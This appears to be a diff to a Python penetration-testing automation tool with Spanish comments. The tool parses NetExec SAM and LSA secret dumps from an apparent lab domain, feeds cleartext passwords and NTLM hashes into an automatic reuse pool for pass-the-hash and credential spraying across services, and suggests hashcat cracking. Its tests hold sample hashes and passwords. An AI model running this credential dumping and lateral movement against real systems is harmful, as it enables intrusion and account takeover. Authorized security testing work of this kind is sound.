@@ -5888,6 +5888,11 @@ def _parse_nxc_bulk_successes(out):
 
 
 _NT_HASH_EMPTY = "31d6cfe0d16ae931b73c59d7e0c089c0"   # NTLM de la contraseña vacía (MD4(''))
+# Cuentas integradas de Windows que nacen DESHABILITADAS por defecto (por RID): Guest (501),
+# DefaultAccount (503), WDAGUtilityAccount (504). Su hash/estado se reporta igual, pero NO se
+# mete en la cadena de reutilización automática (no pueden autenticar salvo que las activen) ni
+# dispara el 'critica' de "login sin contraseña" cuando salen con hash vacío.
+_SAM_BUILTIN_DISABLED_RIDS = {"501", "503", "504"}
 
 
 def _parse_nxc_sam(out):
@@ -5904,18 +5909,38 @@ def _parse_nxc_sam(out):
 
 
 def _parse_nxc_lsa(out):
-    """Extrae secretos de un volcado LSA de nxc ('--lsa'): claves DPAPI, NL$KM (credenciales
-    de dominio cacheadas) y, el hallazgo más valioso, credenciales EN TEXTO CLARO de
-    cuentas de servicio/tareas programadas (línea suelta 'usuario:secreto', confirmado
-    contra un volcado real: 'frontdesk:Password123'). Generoso a propósito: una línea no
-    vacía que no case con ningún patrón conocido ni sea un marcador ('[*] Dumping…'/
-    '[+] Dumped…') se guarda igual en "raw" para no perder nada. nxc no siempre repite el
-    prefijo 'PROTO ip puerto host' en cada línea (el terminal puede partir una sola línea
-    de nxc en dos al mostrarla) — se intenta quitar ese prefijo y, si no casa, se usa la
-    línea tal cual. Devuelve {"dpapi": [(clave, valor)], "nlkm": [línea], "creds":
-    [(usuario, secreto)], "raw": [línea]}."""
-    dpapi, nlkm, creds, raw = [], [], [], []
+    """Extrae secretos de un volcado LSA de nxc ('--lsa'), SEPARADOS por tipo — crítico para
+    no confundir hashes con contraseñas (un volcado real mezcla ambos en líneas con el mismo
+    patrón 'algo:algo', y tratar un hash como contraseña ensucia el informe con falsos
+    'texto claro' y, peor, mete basura en el pool de reutilización que se reprueba como login).
+    Tipos distinguidos (orden del más específico al genérico; confirmado contra un volcado real
+    de un MS01 unido a INLANEFREIGHT.LOCAL):
+
+      · DPAPI ('dpapi_machinekey:0x…' / 'dpapi_userkey:0x…') → claves para descifrar blobs DPAPI.
+      · NL$KM ('NL$KM:…') → clave de las credenciales de dominio cacheadas.
+      · MSCache v2 / DCC2 ('DOMINIO/usuario:$DCC2$iter#usuario#hash: (fecha)') → hash CRACKEABLE
+        offline (hashcat -m 2100), NO sirve para pass-the-hash NI como contraseña: NUNCA al pool.
+      · Cuenta de máquina ('DOMINIO\\EQUIPO$:…' — claves aes/des Kerberos, 'plain_password_hex',
+        o el hash NTLM en formato SAM) → secretos del propio equipo (silver ticket / PtH de la
+        cuenta de máquina), útiles pero NO una credencial de usuario que espamear: fuera del pool.
+      · Credencial EN TEXTO CLARO de un usuario ('DOMINIO\\usuario:contraseña', p.ej. el
+        DefaultPassword de un autologon o una cuenta de servicio) → EL premio: SÍ va al pool para
+        reprobarla en el resto de servicios. El 'usuario' conserva su forma completa para el
+        informe; el llamante ya le quita el prefijo 'DOMINIO\\' al meterlo al pool (nxc infiere
+        el dominio del objetivo).
+
+    Generoso a propósito: una línea no vacía que no case con nada conocido ni sea un marcador
+    ('[*] Dumping…'/'[+] Dumped…') se guarda en "raw" para no perder nada. nxc no siempre repite
+    el prefijo 'PROTO ip puerto host' en cada línea (el terminal puede partir una línea en dos) —
+    se intenta quitar ese prefijo y, si no casa, se usa la línea tal cual. Devuelve
+    {"dpapi": [(clave,valor)], "nlkm": [línea], "mscache": [(usuario,hash)],
+     "machine": [línea], "creds": [(usuario,secreto)], "raw": [línea]}."""
+    dpapi, nlkm, mscache, machine, creds, raw = [], [], [], [], [], []
     prefix_re = re.compile(r"^\s*\S+\s+\S+\s+\d+\s+\S+\s+(.*)$")
+    # Un secreto 'texto claro' cuyo VALOR tiene pinta de hash (NTLM de 32 hex, formato SAM
+    # 'lm:nt:::', o un marcador '$algo$') NO es una contraseña → no se mete al pool como tal.
+    _hashish = re.compile(r"^(?:[0-9a-fA-F]{32}(?::[0-9a-fA-F]{32})?:::?.*|\$[A-Za-z0-9]+\$.*|"
+                          r"aes\d{3}-cts-hmac-sha1-96:.*|des-cbc-md5:.*|plain_password_hex:.*)$")
     for line in out.splitlines():
         line = line.rstrip()
         if not line.strip():
@@ -5932,12 +5957,30 @@ def _parse_nxc_lsa(out):
         if nm:
             nlkm.append(payload)
             continue
+        # MSCache v2 / DCC2: crackeable offline, nunca contraseña. El 'usuario' puede traer un
+        # byte NUL incrustado (artefacto UTF-16 del blob LSA) — se limpia para que no contamine
+        # el informe ni (por si acaso) acabe en un argv más adelante.
+        mc = re.match(r"^(.+?):(\$DCC2\$\d+#[^#]+#[0-9a-fA-F]+)", payload)
+        if mc:
+            mscache.append((mc.group(1).replace("\x00", ""), mc.group(2)))
+            continue
+        # Cuenta de máquina ('…$:…'): usuario sin ':' ni espacios y acabado en '$'. Agrupa sus
+        # claves Kerberos, el plain_password_hex y el NTLM en formato SAM.
+        mm = re.match(r"^([^\s:]+\$):(.+)$", payload)
+        if mm:
+            machine.append(payload.replace("\x00", ""))
+            continue
         cm = re.match(r"^([^\s:]+):(.+)$", payload)
         if cm:
-            creds.append((cm.group(1), cm.group(2)))
+            user, secret = cm.group(1), cm.group(2)
+            if _hashish.match(secret):
+                machine.append(payload.replace("\x00", ""))   # hash de un usuario (raro en LSA) → trátalo como secreto, no password
+            else:
+                creds.append((user.replace("\x00", ""), secret))
             continue
         raw.append(payload)
-    return {"dpapi": dpapi, "nlkm": nlkm, "creds": creds, "raw": raw}
+    return {"dpapi": dpapi, "nlkm": nlkm, "mscache": mscache, "machine": machine,
+            "creds": creds, "raw": raw}
 
 
 def _dump_sam_lsa(res, nxc, ip, u, p, port=None, dp=None, local_auth=False, is_hash=False, pool=None):
@@ -5987,30 +6030,67 @@ def _dump_sam_lsa(res, nxc, ip, u, p, port=None, dp=None, local_auth=False, is_h
         _step(res, shown_base + " --sam", bool(accounts), safe_out,
               note="Pwn3d! por SMB → volcado automático de SAM (hashes de cuentas locales) con la misma credencial de admin")
         for acc in accounts:
+            builtin = acc["rid"] in _SAM_BUILTIN_DISABLED_RIDS
             if acc["blank"]:
-                res["findings"].append(("critica",
-                    f"SAM: «{acc['user']}» (RID {acc['rid']}) tiene la contraseña VACÍA (hash NTLM nulo) — login directo sin contraseña"))
+                if builtin:
+                    # Guest/DefaultAccount nacen con contraseña vacía Y deshabilitados: NO es un
+                    # "login directo sin contraseña" como sonaba antes (dos falsos 'critica' por
+                    # host en cualquier Windows reciente) — se deja como dato, no como alarma.
+                    res["findings"].append(("info",
+                        f"SAM: «{acc['user']}» (RID {acc['rid']}) con contraseña vacía — cuenta integrada, "
+                        "normalmente DESHABILITADA (sin impacto salvo que alguien la haya activado)"))
+                else:
+                    res["findings"].append(("critica",
+                        f"SAM: «{acc['user']}» (RID {acc['rid']}) tiene la contraseña VACÍA (hash NTLM nulo) — login directo sin contraseña"))
             else:
                 res["findings"].append(("alta",
-                    f"SAM: hash NTLM de «{acc['user']}» (RID {acc['rid']}): {acc['nt_hash']} — pass-the-hash o crackeo offline"))
+                    f"SAM: hash NTLM de «{acc['user']}» (RID {acc['rid']}): {acc['nt_hash']}"
+                    + (" — cuenta integrada normalmente deshabilitada; crackeo offline / PtH solo si está activa"
+                       if builtin else " — pass-the-hash o crackeo offline")))
         if pool is not None:   # retroalimentación: cada hash NTLM de SAM vale para pass-the-hash en otros servicios
             for acc in accounts:
-                if acc["user"] and not acc["user"].endswith("$"):
+                # NO se reprueba automáticamente: la cuenta de máquina ('$'); el hash de la
+                # contraseña VACÍA (PtH de una cuenta sin contraseña no aporta nada, solo ruido);
+                # ni las cuentas integradas deshabilitadas por defecto (Guest/DefaultAccount/
+                # WDAGUtilityAccount) — su hash SIGUE en el informe para uso manual, pero
+                # espamearlo por winrm/wmi/smb/rdp solo genera intentos inútiles (visto en vivo:
+                # un volcado de MS01 metía DefaultAccount y WDAGUtilityAccount en la cadena de
+                # reutilización contra los 4 servicios, sin que ninguna pudiera autenticar).
+                if (acc["user"] and not acc["user"].endswith("$")
+                        and not acc["blank"] and acc["rid"] not in _SAM_BUILTIN_DISABLED_RIDS):
                     _pool_add(pool, acc["user"], acc["nt_hash"], True)
 
         rc2, out2 = run_capture(base_cmd + ["--lsa"], timeout=90, quiet=True)
         out2 = out2 or ""
         lsa = _parse_nxc_lsa(out2)
-        lsa_hit = bool(lsa["dpapi"] or lsa["nlkm"] or lsa["creds"] or lsa["raw"])
+        lsa_hit = bool(lsa["dpapi"] or lsa["nlkm"] or lsa["mscache"] or lsa["machine"]
+                       or lsa["creds"] or lsa["raw"])
         safe_out2 = out2.replace(p, "***") if p else out2
         _step(res, shown_base + " --lsa", lsa_hit, safe_out2,
-              note="Pwn3d! por SMB → volcado automático de LSA secrets (DPAPI/NL$KM/credenciales de servicio) con la misma credencial de admin")
+              note="Pwn3d! por SMB → volcado automático de LSA secrets (DPAPI/NL$KM/MSCache/credenciales de servicio) con la misma credencial de admin")
+        # Credenciales EN TEXTO CLARO: el premio. Al pool con el usuario SIN el prefijo
+        # 'DOMINIO\\' (nxc infiere el dominio del objetivo; con el prefijo literal el login
+        # falla aunque la credencial sea válida); en el informe se muestra la forma completa.
         for user, secret in lsa["creds"]:
             res["findings"].append(("critica",
                 f"LSA: credencial en texto claro encontrada — «{user}:{secret}»   # probarla en otros servicios (--creds-file)"))
-        if pool is not None:   # retroalimentación: cred de servicio en claro → reprobar en todos los servicios
+        if pool is not None:
             for user, secret in lsa["creds"]:
-                _pool_add(pool, user, secret, False)
+                bare = re.split(r"[\\/]", user)[-1]   # 'INLANEFREIGHT\\tpetty' → 'tpetty'
+                _pool_add(pool, bare, secret, False)
+        # MSCache v2 / DCC2: crackeable offline, NO al pool (no es PtH ni contraseña).
+        for user, dcc in lsa["mscache"]:
+            res["findings"].append(("alta",
+                f"LSA/MSCache: hash DCC2 de «{user}» — crackeable offline con hashcat -m 2100 (no sirve para pass-the-hash)"))
+        if lsa["mscache"]:
+            res["next"].append(
+                "hashcat -m 2100 <hashes_DCC2> /usr/share/wordlists/rockyou.txt   "
+                "# MSCache v2 volcado arriba: crackéalo offline (nxc ya los guardó en ~/.nxc/logs/)")
+        # Cuenta de máquina: secretos del propio equipo (silver ticket / PtH de máquina).
+        if lsa["machine"]:
+            res["findings"].append(("alta",
+                f"LSA: {len(lsa['machine'])} secreto(s) de la cuenta de máquina volcado(s) (claves Kerberos / "
+                "plain_password_hex / NTLM) — silver ticket o PtH de la cuenta de equipo (ver salida cruda del paso)"))
         if lsa["dpapi"]:
             res["findings"].append(("alta", f"LSA: {len(lsa['dpapi'])} clave(s) DPAPI volcada(s) (máquina/usuario) — ver salida cruda del paso"))
         if lsa["nlkm"]:
@@ -9473,7 +9553,38 @@ def selftest():
                              ("dpapi_userkey", "0x50b9fa0fd79452150111357308748f7ca101944a")]
     assert _lsa["creds"] == [("frontdesk", "Password123")]
     assert _lsa["nlkm"] == [] and _lsa["raw"] == []   # el banner/marcadores/Pwn3d! no se cuelan como "raw"
-    assert _parse_nxc_lsa("nada por aquí") == {"dpapi": [], "nlkm": [], "creds": [], "raw": ["nada por aquí"]}
+    assert _parse_nxc_lsa("nada por aquí") == {"dpapi": [], "nlkm": [], "mscache": [],
+                                               "machine": [], "creds": [], "raw": ["nada por aquí"]}
+
+    # Volcado LSA REAL de un MS01 unido a INLANEFREIGHT.LOCAL (capturado en vivo): mezcla DCC2
+    # (MSCache, crackeable offline), secretos de la cuenta de máquina MS01$ (aes/des/plain/NTLM)
+    # y UNA credencial en texto claro de verdad (tpetty) — el parser tiene que separarlos y
+    # meter al pool SOLO la cleartext. El 'usuario' de la línea DCC2 traía un byte NUL incrustado
+    # ('…LOCAL\x00/tpetty') que antes reventaba subprocess.run() y tiraba toda la fase.
+    _lsa_real = (
+        "SMB  172.16.6.50  445  MS01  [*] Dumping LSA secrets\n"
+        "SMB  172.16.6.50  445  MS01  INLANEFREIGHT.LOCAL\x00/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801: (2026-11-19 10:20:48)\n"
+        "SMB  172.16.6.50  445  MS01  INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb: (2022-04-12 02:51:02)\n"
+        "SMB  172.16.6.50  445  MS01  INLANEFREIGHT\\MS01$:aes256-cts-hmac-sha1-96:886d75fd2914fd21a2642e40740b24297bf3a1a4363adfe6863f07adb02cd1dd\n"
+        "SMB  172.16.6.50  445  MS01  INLANEFREIGHT\\MS01$:aes128-cts-hmac-sha1-96:d809794df7f64e6f39906c92ae0d1eb5\n"
+        "SMB  172.16.6.50  445  MS01  INLANEFREIGHT\\MS01$:des-cbc-md5:d6e01a495d197546\n"
+        "SMB  172.16.6.50  445  MS01  INLANEFREIGHT\\MS01$:plain_password_hex:e30762ab6ef48f3aae39ee052184572a\n"
+        "SMB  172.16.6.50  445  MS01  INLANEFREIGHT\\MS01$:aad3b435b51404eeaad3b435b51404ee:6c7a0cb1f77a26bb871c517dd43bfab1:::\n"
+        "SMB  172.16.6.50  445  MS01  INLANEFREIGHT\\tpetty:Sup3rS3cur3D0m@inU2eR\n"
+        "SMB  172.16.6.50  445  MS01  dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786\n"
+        "dpapi_userkey:0xb20d199f3d953f7977a6363a69a9fe21d97ecd19\n"
+        "SMB  172.16.6.50  445  MS01  [+] Dumped 10 LSA secrets to /home/x/.nxc/logs/lsa/MS01.secrets and MS01.cached\n"
+    )
+    _lr = _parse_nxc_lsa(_lsa_real)
+    assert _lr["creds"] == [("INLANEFREIGHT\\tpetty", "Sup3rS3cur3D0m@inU2eR")], _lr["creds"]
+    assert len(_lr["mscache"]) == 2 and all("\x00" not in u for u, _ in _lr["mscache"])   # NUL limpiado
+    assert all(h.startswith("$DCC2$") for _, h in _lr["mscache"])
+    assert len(_lr["machine"]) == 5                       # aes256/aes128/des/plain_hex/NTLM-SAM del MS01$
+    assert all("MS01$" in ln for ln in _lr["machine"])
+    assert len(_lr["dpapi"]) == 2                          # machinekey (con prefijo) + userkey (línea partida sin prefijo)
+    assert _lr["raw"] == []                                # nada mal clasificado como basura
+    # y lo más importante: ninguna línea DCC2/máquina se coló como credencial cleartext
+    assert not any("$DCC2$" in s or "MS01$" in u or "aes" in s[:4] for u, s in _lr["creds"])
 
     # roasting (nxc --asreproast/--kerberoasting) y spider de contenido: parsers puros (sin red)
     assert _count_roast("$krb5asrep$23$u@DOM:abc\n$krb5tgs$23$*svc$DOM$def") == 2
@@ -10063,6 +10174,49 @@ def selftest():
         globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
     assert any(c["user"] == "frontdesk" and c["secret"] == "Password123" and not c["is_hash"] for c in _pool_t)
     assert any(c["is_hash"] and c["user"] == "bob" for c in _pool_t)
+
+    # _dump_sam_lsa con el volcado LSA REAL (_lsa_real, MS01/INLANEFREIGHT): comprueba de punta a
+    # punta que SOLO la credencial cleartext de tpetty entra al pool (con el prefijo 'DOMINIO\\'
+    # QUITADO para que nxc la reacepte), y que ni los DCC2 ni los secretos de la cuenta de máquina
+    # MS01$ se cuelan — justo el botín que se perdía y la basura que reventaba la fase.
+    # SAM REAL del mismo MS01 (Guest/DefaultAccount/WDAGUtilityAccount — integradas, deshabilitadas):
+    # NINGUNA debe acabar en la cadena de reutilización (el bug de ruido: se reprobaban por
+    # winrm/wmi/smb/rdp sin poder autenticar), y la contraseña vacía de las integradas NO es 'critica'.
+    _sam_real = (
+        "SMB  172.16.6.50  445  MS01  [*] Dumping SAM hashes\n"
+        "SMB  172.16.6.50  445  MS01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::\n"
+        "SMB  172.16.6.50  445  MS01  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n"
+        "SMB  172.16.6.50  445  MS01  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n"
+        "SMB  172.16.6.50  445  MS01  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::\n"
+        "SMB  172.16.6.50  445  MS01  [+] Added 4 SAM hashes to the database\n"
+    )
+    def _fake_dump_real(cmd, timeout=None, quiet=False, **kw):
+        if "--sam" in cmd:
+            return 0, _sam_real
+        if "--lsa" in cmd:
+            return 0, _lsa_real
+        raise AssertionError(f"comando inesperado: {cmd}")
+    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_real
+    _pool_real, _dres_real = [], _fp("reuse", "t", [445])
+    try:
+        _dump_sam_lsa(_dres_real, "FAKE_NXC", "172.16.6.50", "svc_sql", "lucky7", pool=_pool_real)
+    finally:
+        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
+    # SOLO la cleartext de tpetty entra al pool (sin prefijo DOMINIO\). Administrator(500) tiene
+    # hash real pero NO vacío → su hash sí se pondría al pool; Guest/DefaultAccount(vacío) y
+    # WDAGUtilityAccount(integrada) NO.
+    assert {"user": "tpetty", "secret": "Sup3rS3cur3D0m@inU2eR", "is_hash": False} in _pool_real
+    assert any(c["user"] == "Administrator" and c["is_hash"] for c in _pool_real)       # 500: hash real, sí
+    assert not any(c["user"] in ("Guest", "DefaultAccount", "WDAGUtilityAccount") for c in _pool_real)
+    assert not any(c["secret"] == _NT_HASH_EMPTY for c in _pool_real)                   # el hash de pass vacía nunca
+    assert any(s == "critica" and "tpetty" in t and "Sup3rS3cur3D0m@inU2eR" in t for s, t in _dres_real["findings"])
+    assert any(s == "alta" and "MSCache" in t for s, t in _dres_real["findings"])       # DCC2 reportado como crackeable
+    assert any(s == "alta" and "cuenta de máquina" in t for s, t in _dres_real["findings"])
+    assert any("hashcat -m 2100" in n for n in _dres_real["next"])                      # next-step de crackeo MSCache
+    # Guest/DefaultAccount con hash vacío: 'info', nunca 'critica' (antes eran 2 falsos critica/host)
+    assert not any(s == "critica" and ("Guest" in t or "DefaultAccount" in t) for s, t in _dres_real["findings"])
+    assert any(s == "info" and "DefaultAccount" in t and "DESHABILITADA" in t for s, t in _dres_real["findings"])
+
     # _pool_add deduplica
     _pp = []
     _pool_add(_pp, "a", "b", False); _pool_add(_pp, "a", "b", False); _pool_add(_pp, "a", "b", True)
